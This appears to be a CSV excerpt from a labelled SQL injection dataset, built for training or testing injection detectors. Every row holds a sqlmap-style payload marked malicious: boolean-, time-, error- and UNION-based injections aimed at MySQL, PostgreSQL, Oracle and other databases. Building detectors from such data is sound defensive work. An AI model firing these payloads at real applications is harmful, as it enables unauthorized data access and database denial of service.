row_index,payload_norm,label,sqli_type_hint
9750,"1"" ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( ""rfam"" like ""rfam",1,
9751,"1'+ ( select dnxi where 5850 = 5850 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
9752,-6353%' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( '%' = ',1,
9753,"1'+ ( select 'tyuz' where 3957 = 3957 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) ) +'",1,
9754,"1"" where 9461 = 9461",1,
9755,"-9163"" union all select 3820,3820,3820,3820,3820,3820,3820,3820,3820#",1,
9756,"1' ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( 'qgdv' = 'qgdv",1,
9757,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) +'",1,
9758,1' ) ) as txxn where 7884 = 7884 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,1,
9759,1 where 6173 = 6173,1,
9760,"1 where 6383 = 6383 or elt ( 6272 = 6272,sleep ( 5 ) ) --",1,
9761,"1%"" and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ""%"" = """,1,
9762,"1' where 7504 = 7504 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --",1,
9763,select ( case when ( 4297 = 9086 ) then 4297 else 1/ ( select 0 ) end ) --,1,
9764,"1' ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( 'cqrp' = 'cqrp",1,
9765,"1"" ) as eomu where 6599 = 6599",1,
9766,1'+ ( select 'wyed' where 9896 = 9896,1,
9767,"1'+ ( select oogh where 1167 = 1167 or elt ( 5873 = 5873,sleep ( 5 ) ) #",1,
9768,"-8982'+ ( select anyd where 5358 = 5358 union all select 5358,5358,5358,5358,5358,5358#",1,
9769,"1'+ ( select jrmz where 4762 = 4762 and elt ( 9588 = 9794,9794 ) ) +'",1,
9770,"1"" ) ) union all select null#",1,
9771,"-2263' ) where 7931 = 7931 union all select 7931,7931,7931--",1,
9772,-5585%' ) ) ) or 6990 = 7727,1,
9773,-2300 ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ),1,
9774,"1"" ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( ""wwaq"" = ""wwaq",1,
9775,"1' ) ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( ( 'swua' like 'swua",1,
9776,"1%"" ) ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",1,
9777,end and 'wdce' = 'wdce,1,
9778,"1' ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( 'beoh' = 'beoh",1,
9779,"-5998"" ) as gazd where 2814 = 2814 union all select 2814,2814,2814,2814,2814,2814,2814--",1,
